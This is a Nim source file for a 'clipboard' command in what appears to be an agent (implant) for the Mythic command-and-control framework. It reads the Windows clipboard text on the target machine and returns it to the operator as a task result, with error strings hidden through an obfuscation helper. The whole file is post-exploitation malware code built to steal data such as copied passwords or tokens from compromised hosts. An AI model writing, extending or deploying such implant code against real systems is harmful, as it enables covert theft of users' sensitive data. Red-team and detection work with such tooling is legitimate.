import ../utils/m_responses
import ../utils/debug
import ../utils/strenc
import std/json

when defined(windows):
  import winim/lean

proc clipboard*(taskId: string, params: JsonNode): JsonNode =
  ## Get the current clipboard contents (Windows only)
  when defined(windows):
    try:
      # Open the clipboard
      if OpenClipboard(0) == 0:
        return mythicError(taskId, obf("Failed to open clipboard"))
      
      # Check if clipboard contains text
      if IsClipboardFormatAvailable(CF_UNICODETEXT) == 0:
        CloseClipboard()
        return mythicError(taskId, obf("Clipboard does not contain text data"))
      
      # Get clipboard data handle
      let hClipboardData = GetClipboardData(CF_UNICODETEXT)
      if hClipboardData == 0:
        CloseClipboard()
        return mythicError(taskId, obf("Failed to get clipboard data"))
      
      # Lock the clipboard data to get a pointer
      let pchData = GlobalLock(hClipboardData)
      if pchData == nil:
        CloseClipboard()
        return mythicError(taskId, obf("Failed to lock clipboard data"))
      
      # Convert wide string to regular string
      let clipboardText = $cast[LPWSTR](pchData)
      
      # Unlock and close
      discard GlobalUnlock(hClipboardData)
      CloseClipboard()
      
      debug &"[DEBUG] Retrieved clipboard content ({clipboardText.len} characters)"
      
      return mythicSuccess(taskId, clipboardText)
      
    except Exception as e:
      CloseClipboard()
      return mythicError(taskId, obf("Error reading clipboard: ") & e.msg)
  else:
    return mythicError(taskId, obf("clipboard command is only available on Windows"))